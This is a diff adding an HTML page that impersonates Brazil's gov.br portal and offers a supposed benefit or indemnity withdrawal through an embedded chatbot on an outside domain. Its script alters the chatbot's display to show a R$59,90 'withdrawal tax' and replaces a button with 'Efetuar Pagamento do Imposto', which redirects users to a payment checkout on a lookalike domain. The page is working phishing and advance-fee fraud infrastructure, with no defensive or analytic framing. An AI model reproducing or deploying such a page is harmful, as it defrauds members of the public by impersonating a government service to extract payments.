@@ -1,0 +1,558 @@
+<!DOCTYPE html><html lang="pt-BR">
+<head>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Liberação de Saque - gov.br</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
+    <style>
+
+
+        #typebotFrame {
+            width: 100%;
+            min-height: 500px;
+            max-width: 100%;
+        }
+
+        html,
+    body {
+      height: 100%;
+      overflow-x: hidden;
+      margin: 0;
+    }
+
+    body {
+      font-family: 'Rawline', sans-serif;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .items-center p{display:inline-block}
+
+    header {
+      background-color: white;
+      padding: 12px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #e5e5e5;
+      box-shadow: none;
+    }
+
+    header .logo svg {
+      height: 24px;
+      width: auto;
+      margin-right: 16px;
+    }
+
+    header .icons {
+      display: flex;
+      align-items: center;
+    }
+
+    header .icons button {
+      background: none;
+      border: none;
+      margin-left: 24px;
+      cursor: pointer;
+    }
+
+    header .icons button i {
+      font-size: 16px;
+      color: #1451b4;
+    }
+
+    header .user {
+      background-color: blue;
+      color: white;
+      border: none;
+      border-radius: 50px;
+      padding: 6px 16px;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    header .user i {
+      margin-right: 8px;
+    }
+
+    nav {
+      background-color: white;
+      padding: 16px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #e5e5e5;
+      margin-bottom: 20px;
+    }
+
+    nav button {
+      background: none;
+      border: none;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    nav button i {
+      font-size: 16px;
+      color: #1451b4;
+      margin-right: 10px;
+    }
+
+    nav button span {
+      color: #666;
+      font-size: 14px;
+      font-weight: 300;
+    }
+    footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      text-align: center;
+      background-color: #fff;
+      border-top: 1px solid #e5e5e5;
+      z-index: 1000;
+      height: 60px;
+    }
+
+    footer img {
+      max-width: 200px;
+      height: auto;
+      vertical-align: middle;
+    }
+
+    .chat-container {
+      position: absolute;
+      top: 220px;
+      bottom: 60px;
+      left: 0;
+      right: 0;
+      margin: 0 auto;
+      max-width: 600px;
+    }
+
+    .message {
+      display: inline-block;
+      clear: both;
+      padding: 12px 16px;
+      margin: 10px 0;
+      border-radius: 8px;
+      max-width: 80%;
+      line-height: 1.5em;
+      font-size: 17px;
+      word-wrap: break-word;
+      position: relative;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: fadeInUp 0.4s forwards;
+    }
+
+    @keyframes fadeInUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .bot-message {
+      background-color: #fff;
+      color: #333;
+      text-align: left;
+      float: left;
+      border: 1px solid #ddd;
+      margin-left: 45px;
+    }
+
+    .bot-message::before {
+      content: "";
+      position: absolute;
+      top: 12px;
+      left: -45px;
+      width: 32px;
+      height: 32px;
+      background-image: url("images/8QkUzPTGVGp6.png");
+      background-size: cover;
+      border-radius: 50%;
+    }
+
+    .user-message {
+      background-color: #1451b4;
+      color: #fff;
+      text-align: right;
+      float: right;
+    }
+
+    .typing-indicator {
+      display: inline-flex;
+      align-items: center;
+      margin: 10px 0;
+      float: left;
+      height: 32px;
+      margin-left: 45px;
+    }
+
+    .typing-indicator .dot {
+      width: 8px;
+      height: 8px;
+      margin: 0 3px;
+      background-color: #1451b4;
+      border-radius: 50%;
+      animation: bounce 1.4s infinite;
+    }
+
+    .typing-indicator .dot:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .typing-indicator .dot:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes bounce {
+
+      0%,
+      80%,
+      100% {
+        transform: scale(0);
+      }
+
+      40% {
+        transform: scale(1);
+      }
+    }
+
+    .chat-input-container {
+      width: 100%;
+      margin-top: 10px;
+      display: flex;
+      align-items: center;
+      clear: both;
+    }
+
+    .chat-input-container input[type="text"] {
+      flex: 1;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .chat-input-container button {
+      margin-left: 8px;
+      background-color: #1451b4;
+      color: #fff;
+      padding: 12px 18px;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .common-button {
+      display: block;
+      background-color: #1451b4;
+      color: #fff;
+      padding: 12px 18px;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 12px;
+      clear: both;
+    }
+
+    #popup {
+      display: none;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    @media (max-width: 600px) {
+      header {
+        padding: 8px 16px;
+      }
+
+      nav {
+        padding: 8px 16px;
+      }
+
+      footer {
+        height: 80px;
+      }
+
+      .chat-container {
+        top: 150px;
+        bottom: 60px;
+      }
+
+      .message {
+        font-size: 16px;
+      }
+
+      .chat-input-container input[type="text"] {
+        font-size: 15px;
+      }
+
+      .chat-input-container button,
+      .common-button {
+        font-size: 15px;
+        padding: 10px 14px;
+      }
+
+      footer img {
+        max-width: 150px;
+      }
+    }
+    
+    </style>
+    
+</head>
+
+<body class="bg-[#1351B4] flex flex-col items-center min-h-screen">
+    <header>
+        <div class="logo">
+          <svg width="148" height="45" viewBox="0 0 148 45">
+            <title>GOV.BR</title>
+            <text x="0" y="33" font-size="40" font-weight="900" font-family="Arial, sans-serif"><tspan fill="#2864AE">g</tspan><tspan fill="#F7B731">o</tspan><tspan fill="#27AE60">v</tspan><tspan fill="#2864AE">.b</tspan><tspan fill="#F7B731">r</tspan>
+            </text>
+          </svg>
+        </div>
+        <div class="icons">
+          <button><i class="fas fa-ellipsis-v"></i></button>
+          <button><i class="fas fa-cookie-bite"></i></button>
+          <button><i class="fas fa-th"></i></button>
+          <button class="user" id="user-button" style="background-color: #1451b4;">
+            <i class="fas fa-user" style="color: #fff;"></i>
+            <span id="header-user-name">Usuário</span>
+          </button>
+        </div>
+      </header>
+      <nav>
+        <button><i class="fas fa-bars"></i><span>
+            <p>Benefício <span> > </span> Indenização <span> > </span> Atendimento</p>
+          </span></button>
+        <button><i class="fas fa-search"></i></button>
+      </nav>
+
+    <main class="flex-1 bg-[#1351B4] p-4 w-full max-w-full">
+        <div class="max-w-[600px] w-full space-y-4 mt-2 mx-auto">
+            <div class="w-full bg-white p-6 rounded-lg">
+                <div class="space-y-6 p-0">
+                    <script type="module">
+                        import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.37/dist/web.js';
+                      
+                        Typebot.initStandard({
+                          typebot: "fb1",
+                          apiHost: "https://web.atendeconsulta.site",
+                        });
+                      </script>
+                      
+                      <typebot-standard style="width: 100%; height: 500px; "></typebot-standard>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            console.log("DOM completamente carregado e analisado");
+
+            // --- ADICIONADO PARA PEGAR O NOME DA URL ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const nomeCompleto = urlParams.get('nome');
+        if (nomeCompleto) {
+            const primeiroNome = nomeCompleto.split(' ')[0];
+            const headerUserName = document.getElementById('header-user-name');
+            if (headerUserName) {
+                headerUserName.textContent = primeiroNome;
+            }
+        }
+        // -------------------------------------------
+            
+            // Esperar um pouco para garantir que o typebot seja carregado
+            setTimeout(observarTypebot, 1000);
+            
+            // Tentar novamente após 3 segundos se não funcionar na primeira vez
+            setTimeout(observarTypebot, 3000);
+            
+            // E uma última tentativa após 5 segundos
+            setTimeout(observarTypebot, 5000);
+        });
+
+        const headerUserName = document.getElementById('header-user-name');
+  if (headerUserName) {
+    const primeiroNome = nome.split(' ')[0]; // Pega o primeiro nome
+    headerUserName.textContent = primeiroNome;
+  }
+        
+        function observarTypebot() {
+            var shadowHost = document.querySelector("typebot-standard");
+            if (!shadowHost) {
+                console.log("Elemento typebot-standard não encontrado ainda");
+                return;
+            }
+            
+            if (!shadowHost.shadowRoot) {
+                console.log("Shadow DOM ainda não disponível");
+                return;
+            }
+            
+            console.log("Typebot encontrado, configurando observer");
+            substituirElemento(shadowHost);
+        }
+    
+        function substituirElemento(shadowHost) {
+            var shadowRoot = shadowHost.shadowRoot;
+            var observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    mutation.addedNodes.forEach(function(node) {
+                        console.log("Node adicionado:", node);
+
+                        // Modificar a imagem com a taxa
+                        if (node.nodeType === 1) {
+                            // Procurar por imagens que contêm a URL da API
+                            const images = node.querySelectorAll('img[src*="apis.chama-gemea.com"]');
+                            images.forEach(function(img) {
+                                if (img.src.includes('taxa=R$59,90')) {
+                                    console.log("Encontrou imagem com taxa para alterar:", img.src);
+                                    img.src = img.src.replace('taxa=R$59,90', 'taxa=R$59,90');
+                                }
+                            });
+
+                            // Abordagem direta para substituir o texto do imposto
+                            // Procurar especificamente pelo div que contém o texto "Imposto de Saque"
+                            const allDivs = node.querySelectorAll('div[data-element-type="p"]');
+                            allDivs.forEach(function(div) {
+                                // Verificar o texto completo do div para identificar o que contém o imposto
+                                const divText = div.textContent || '';
+                                
+                                // Se o div contém texto relacionado a imposto
+                                if (divText.includes('mposto') || divText.includes('mpo') || divText.includes('aque')) {
+                                    console.log("Encontrou div potencial de imposto:", divText);
+                                    
+                                    // Substituir diretamente o HTML interno do div
+                                    // Esta abordagem mais agressiva substitui todo o conteúdo do div
+                                    const originalHTML = div.innerHTML;
+                                    console.log("HTML original:", originalHTML);
+                                    
+                                    // Criar uma cópia do HTML e substituir a parte que contém 59,90
+                                    let newHTML = originalHTML;
+                                    
+                                    // Tentar diferentes padrões de substituição
+                                    if (originalHTML.includes('59') && originalHTML.includes('90')) {
+                                        // Substituir o span completo que contém o valor
+                                        const boldSpanRegex = /<span class="slate-bold">[^<]*?59[^<]*?90[^<]*?<\/span>/;
+                                        const match = originalHTML.match(boldSpanRegex);
+                                        
+                                        if (match) {
+                                            console.log("Encontrou match para substituir:", match[0]);
+                                            // Criar o novo span com o valor 12,90
+                                            const newSpan = match[0].replace(/59[\s\S]*?90/, '59,90');
+                                            newHTML = originalHTML.replace(match[0], newSpan);
+                                            div.innerHTML = newHTML;
+                                            console.log("HTML após substituição:", div.innerHTML);
+                                        } else {
+                                            // Abordagem mais agressiva: substituir diretamente no HTML
+                                            // Procurar por qualquer sequência que contenha 5 e 9 e 9 e 0 próximos
+                                            newHTML = originalHTML.replace(/([\s\S]*?5[\s\S]*?9[\s\S]*?,[\s\S]*?9[\s\S]*?0[\s\S]*?)/, function(match) {
+                                                console.log("Substituindo sequência:", match);
+                                                return match.replace(/5[\s\S]*?9[\s\S]*?,[\s\S]*?9[\s\S]*?0/, 'R$ 59,90');
+                                            });
+                                            div.innerHTML = newHTML;
+                                        }
+                                    }
+                                }
+                            });
+                            
+                            // Abordagem alternativa: substituir diretamente no HTML do node
+                            if (node.innerHTML) {
+                                // Procurar por spans com classe slate-bold que contenham 59,90
+                                const spans = node.querySelectorAll('span.slate-bold');
+                                spans.forEach(function(span) {
+                                    // Verificar se o span contém os números 5, 9, 9, 0 nessa ordem
+                                    const text = span.textContent || '';
+                                    if (text.match(/5[\s\S]*?9[\s\S]*?,[\s\S]*?9[\s\S]*?0/)) {
+                                        console.log("Encontrou span com valor 59,90:", text);
+                                        // Substituir o conteúdo do span por R$ 12,90
+                                        // Primeiro, salvar o HTML original para comparar
+                                        const originalHTML = span.innerHTML;
+                                        // Substituir o conteúdo
+                                        span.innerHTML = 'R$ 59,90';
+                                        console.log("Substituiu de", originalHTML, "para", span.innerHTML);
+                                    }
+                                });
+                            }
+                        }
+
+                        // Código original para substituir o botão
+                        if (node.nodeType === 1 && node.matches("div[data-blockid='xndqr3k29412j1n5erw1e3kz']")) {
+                            node.childNodes.forEach(function(childNode) {
+                                if (childNode.nodeType === 1 && childNode.matches("div[class='flex flex-col gap-2 w-full']")) {
+                                    var oldButton = childNode.querySelector("button[data-itemid='i5qm990037jv7h4yuhpor8ce']");
+                                    if (oldButton) {
+                                        var newButton = document.createElement("button");
+                                        newButton.className = oldButton.className;
+                                        newButton.textContent = "Efetuar Pagamento do Imposto";
+                                        newButton.style.cssText = "background-color: rgb(225, 0, 108); color: white; border: none; border-radius: 4px; padding: 10px 20px; cursor: pointer;";
+                                        newButton.addEventListener("click", function() {
+                                            // Substitua pela URL real do checkout
+                                            window.location.href = "https://seguro.atendimentoideniza.site/r/42K2h10WJAwm909O";
+                                        });
+                                        oldButton.parentNode.replaceChild(newButton, oldButton);
+                                        observer.disconnect();
+                                    }
+                                }
+                            });
+                        }
+                    });
+                });
+            });
+            
+            observer.observe(shadowRoot, { childList: true, subtree: true });
+            console.log("Observando shadowRoot de typebot-standard");
+        }
+    </script>
+<footer>
+    <img src="images/KbN0UhOPAgth.png" alt="Rodapé">
+  </footer>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      function aplicarEstiloNoShadow() {
+        const shadowHost = document.querySelector('typebot-standard');
+        if (shadowHost && shadowHost.shadowRoot) {
+          const style = document.createElement('style');
+          style.textContent = `
+            .bubble-typing {
+              background-color: #f7f8ff !important;
+            }
+          `;
+          shadowHost.shadowRoot.appendChild(style);
+          console.log('Estilo aplicado no shadowRoot.');
+        } else {
+          console.log('ShadowRoot ainda não disponível, tentando novamente em 1s...');
+          setTimeout(aplicarEstiloNoShadow, 1000);
+        }
+      }
+  
+      aplicarEstiloNoShadow();
+    });
+  </script>
+  
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"92912729f803ae87","version":"2025.1.0","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"e6e4654337474b17bf48299d49e4df6c","b":1}' crossorigin="anonymous"></script>
+</body>
+</html>
